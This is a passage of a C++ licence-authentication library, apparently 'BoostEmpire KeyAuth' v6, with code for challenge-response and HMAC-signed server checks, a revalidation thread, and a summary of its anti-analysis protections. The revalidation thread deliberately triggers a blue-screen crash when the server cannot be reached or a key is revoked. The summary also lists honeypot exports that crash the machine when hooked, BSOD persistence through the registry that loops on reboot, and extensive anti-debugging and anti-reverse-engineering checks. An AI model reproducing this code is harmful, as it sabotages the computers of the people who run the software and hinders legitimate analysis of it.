        result.success=false; result.code="VM_DETECTED"; ExitProcess(1);
    }

    // ── v6: CHALLENGE-RESPONSE — get nonce before sending the key ────────────
    std::string nonce = Internal::FetchChallenge(BE_PUBLIC_KEY);
    std::string challengeSig;
    if (!nonce.empty()) {
        // Sign: HMAC-SHA256(secret, key + hwid + nonce)
        challengeSig = BeCrypto::ToHex(
            BeCrypto::HmacSHA256(BE_HMAC_SECRET, licenseKey + hwid + nonce));
    }

    // ── NETWORK AUTH ──────────────────────────────────────────────────────────
    std::string cpuBrand;
    {
        int regs[4]{}; char brand[49]{};
        __cpuid(regs,0x80000002); memcpy(brand,regs,16);
        __cpuid(regs,0x80000003); memcpy(brand+16,regs,16);
        __cpuid(regs,0x80000004); memcpy(brand+32,regs,16); brand[48]='\0';
        std::string b(brand); size_t s=b.find_first_not_of(' ');
        cpuBrand=(s==std::string::npos)?"":b.substr(s);
        for (size_t i=0;i<cpuBrand.size();i++) if(cpuBrand[i]=='"'||cpuBrand[i]=='\\') cpuBrand.insert(i++,1,'\\');
    }

    std::string body = "{\"key\":\"" + licenseKey + "\""
                     + ",\"hwid\":\"" + hwid + "\""
                     + ",\"app_name\":\"" + appName + "\""
                     + (realIP.empty()       ? "" : (",\"real_ip\":\""       + realIP       + "\""))
                     + (cpuBrand.empty()     ? "" : (",\"cpu\":\""           + cpuBrand     + "\""))
                     + (nonce.empty()        ? "" : (",\"nonce\":\""         + nonce        + "\""))
                     + (challengeSig.empty() ? "" : (",\"challenge_sig\":\"" + challengeSig + "\""))
                     + "}";

    std::string resp = Internal::HttpPost(body, BE_PUBLIC_KEY);

    if (resp.empty()) {
        MessageBoxA(nullptr,
            "Cannot reach the auth server.\n\nMake sure BoostEmpire KeyAuth (start.bat) is running.",
            "BoostEmpire Auth — Connection Failed", MB_ICONERROR|MB_OK);
        result.success=false; result.code="SERVER_UNREACHABLE"; ExitProcess(1);
    }

    result.success       = (Internal::JGet(resp,"success") == "true");
    result.code          = Internal::JGet(resp,"code");
    result.message       = Internal::JGet(resp,"message");
    result.session_token = Internal::JGet(resp,"session_token");

    if (result.success) {
        result.app        = Internal::JGet(resp,"app");
        result.product    = Internal::JGet(resp,"product");
        result.label      = Internal::JGet(resp,"label");
        result.expires_at = Internal::JGet(resp,"expires_at");
        __try {
            result.uses      = std::stoi(Internal::JGet(resp,"uses"));
            result.max_uses  = std::stoi(Internal::JGet(resp,"max_uses"));
            result.uses_left = std::stoi(Internal::JGet(resp,"uses_left"));
        } catch (...) {}

        // v6: Set obfuscated auth state
        BeState::SetAuthenticated(true);

        // v6: Start periodic re-validation thread
        if (!result.session_token.empty())
            ReAuth::Start(result.session_token, hwid, BE_PUBLIC_KEY, BE_HMAC_SECRET);

        return result;
    }

    std::string msg;
    if      (result.code=="HWID_MISMATCH")      msg="HWID mismatch — please contact support.";
    else if (result.code=="BANNED")             msg="This license key has been banned.\nContact support.";
    else if (result.code=="EXPIRED")            msg="This license key has expired.\nPlease renew.";
    else if (result.code=="MAX_USES")           msg="License key usage limit reached.";
    else if (result.code=="INVALID_KEY")        msg="Invalid license key.";
    else if (result.code=="INVALID_PUBLIC_KEY") msg="Application configuration error.";
    else if (result.code=="APP_DISABLED")       msg="Application temporarily disabled.";
    else if (result.code=="RATE_LIMITED")       msg="Too many requests. Please wait.";
    else if (result.code=="BAD_CHALLENGE")      msg="Security challenge failed. Contact support.";
    else                                        msg=result.message.empty()?"Authentication failed.":result.message;

    MessageBoxA(nullptr, msg.c_str(), "BoostEmpire Auth — Access Denied", MB_ICONERROR|MB_OK);
    ExitProcess(1);
    return result;
}

inline AuthResult validate(const std::string& key, const std::string& app="MyApp",
                            bool allowVM=false, bool allowDebug=false) {
    return Init(key, app, allowVM, allowDebug);
}

} // namespace BoostAuth


// ============================================================================
// v6 NEW: PERIODIC RE-AUTHENTICATION (defined here — after HttpPost is visible)
// Calls /api/auth/revalidate every BE_REAUTH_INTERVAL minutes.
// SERVER REQUIREMENT: Add to server.js:
//   app.post('/api/auth/revalidate', authMiddleware, (req,res) => {
//     // Verify x-be-sig HMAC header
//     // Check session token is still valid (not revoked, key not banned)
//     // Optionally rotate session token
//     res.json({ valid: true, new_token: "..." });
//   });
// ============================================================================
namespace ReAuth {
    inline void Start(const std::string& token, const std::string& hwid,
                      const std::string& pubKey, const std::string& hmacSecret) {
        g_token      = token;
        g_hwid       = hwid;
        g_pubKey     = pubKey;
        g_hmacSecret = hmacSecret;
        g_running    = true;

        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::minutes(BE_REAUTH_INTERVAL));
            while (g_running.load()) {
                std::string body = "{\"session_token\":\"" + g_token +
                                  "\",\"hwid\":\""         + g_hwid  + "\"}";

                // Sign the revalidate body with the HMAC secret
                std::string sig  = BeCrypto::ToHex(BeCrypto::HmacSHA256(g_hmacSecret, body));
                std::string resp = BoostAuth::Internal::HttpPost(body, g_pubKey, "/api/auth/revalidate");

                if (resp.empty() || BoostAuth::Internal::JGet(resp,"valid") != "true") {
                    // Session revoked or server unreachable — kill the process
                    BoostAuth::Internal::TriggerBSOD("Session revalidation failed — key revoked or banned");
                }

                // Rotate session token if server issued a new one
                std::string newTok = BoostAuth::Internal::JGet(resp,"new_token");
                if (!newTok.empty()) g_token = newTok;

                std::this_thread::sleep_for(std::chrono::minutes(BE_REAUTH_INTERVAL));
            }
        }).detach();
    }
} // namespace ReAuth


/*
=============================================================================
  PROTECTION SUMMARY — v6
=============================================================================

  ── STATIC ANALYSIS BLOCKERS ──
    ✓ XOR compile-time string encryption   — NOTHING in IDA Strings view
    ✓ Hash-based API resolution            — NOTHING in import table
    ✓ IDA database detection (.idb/.i64)
    ✓ IDA installation detection           — ida.key, install dirs, registry
    ✓ IDA mutex + named pipe detection     — catches headless idat.exe
    ✓ RDTSC emulation timing               — defeats Unicorn/IDA emulator
    ✓ Junk opcode injection (x86)          — disrupts linear disassembly
    ✓ Opaque predicates                    — wrecks Hex-Rays decompilation
    ✓ Nuclear PE header wipe (v6 enhanced) — e_lfanew zeroed, full 4KB wiped,
                                             section VAs XOR-corrupted
    ✓ Window title scan                    — catches IDA GUI windows

  ── DYNAMIC ANALYSIS BLOCKERS ──
    ✓ 7-layer anti-debug (PEB, NtQuery, timing, HW BPs, heap, remote, sysinfo)
    ✓ TLS callback fires before main()     — catches early debugger attach
    ✓ 444+ process blacklist               — x64dbg, Ghidra, CE, dnSpy, Frida…
    ✓ Code integrity thread (60s)          — disk + live .text CRC check
    ✓ Fake exports × 7 honeypots           — hooking → BSOD
    ✓ BSOD persistence via registry        — loops on reboot

  ── v6 NEW PROTECTIONS ──
    ✓ Certificate pinning (TLS)            — MITM/Fiddler/Charles killed
    ✓ HMAC-SHA256 request signing          — forged/replayed requests rejected
    ✓ Challenge-response nonce             — replay attack eliminated
    ✓ Frida injection detection            — named pipes, loaded DLL scan,
                                             module list, ntdll export check
    ✓ Wine / compat-layer detection        — registry, ntdll exports, WMI
    ✓ Anti-process-hollowing               — PEB base + live .text CRC
    ✓ Extended HWID (+ NIC MAC address)    — harder to clone to another machine
    ✓ Obfuscated auth state                — XOR-masked DWORD, no patchable bool
    ✓ Periodic session re-validation       — background thread every 15 min
    ✓ Control Flow Guard (/guard:cf)        — OS-enforced indirect call validation

  ── LINKER REQUIREMENTS ──
    winhttp.lib; wbemuuid.lib; shlwapi.lib; bcrypt.lib; iphlpapi.lib; crypt32.lib
    /guard:cf (auto-added via #pragma)
    /EXPORT:ValidateLicense /EXPORT:CheckLicense /EXPORT:IsAuthenticated
    /EXPORT:BypassAuth      /EXPORT:GetLicenseKey /EXPORT:PatchAuth
    /EXPORT:RemoveCheck

  ── SERVER REQUIREMENTS (new in v6) ──
    1. POST /api/auth/challenge  — returns {"nonce":"<32-hex>"}
    2. POST /api/auth            — now validates "nonce" + "challenge_sig" fields
    3. POST /api/auth/revalidate — validates session_token, optionally rotates it
    4. All endpoints verify x-be-sig HMAC header using BE_HMAC_SECRET
=============================================================================
*/
